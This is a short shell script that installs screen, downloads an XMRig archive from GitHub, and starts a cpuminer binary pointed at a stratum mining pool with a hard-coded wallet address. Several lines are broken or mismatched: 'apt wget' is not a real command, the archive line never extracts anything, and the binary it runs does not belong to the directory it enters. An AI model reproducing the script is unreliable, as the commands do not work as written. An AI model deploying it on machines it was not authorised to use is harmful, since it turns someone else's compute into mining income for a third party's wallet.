#!/bin/sh
sudo apt wget
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./cpuminer-sse2 -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RMXh2RYKUHFSeZauULH9hUfh1ZDeWMjLgN
